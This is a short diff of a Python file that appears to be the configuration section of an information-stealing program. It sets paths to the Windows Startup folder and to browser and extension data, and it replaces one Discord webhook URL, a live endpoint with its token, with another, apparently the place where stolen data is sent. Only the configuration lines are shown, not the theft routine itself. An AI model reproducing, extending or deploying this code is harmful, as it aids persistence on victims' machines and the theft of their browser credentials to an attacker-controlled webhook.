@@ -20,7 +20,7 @@ APPDATA = os.getenv('APPDATA')
 LOCALAPPDATA = os.getenv('LOCALAPPDATA')
 STORAGE_PATH = os.path.join(APPDATA, "gruppe_storage")
 STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257880456037273611/x20GlSFLeGN3M3Zt5vA-tNVZD8knJYIYNVw5_fgFXv3x7b0nrYDp8qjI2USy729Updph"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1350670566780305502/3V2_lQw2ns9_QxC9l1W1FUWtesIgJpkQvARwo2qG2YWrjizuPkh4vjxxzxn2WXDkb_DT"
 
 # Browser and extension paths
 CHROMIUM_BROWSERS = [
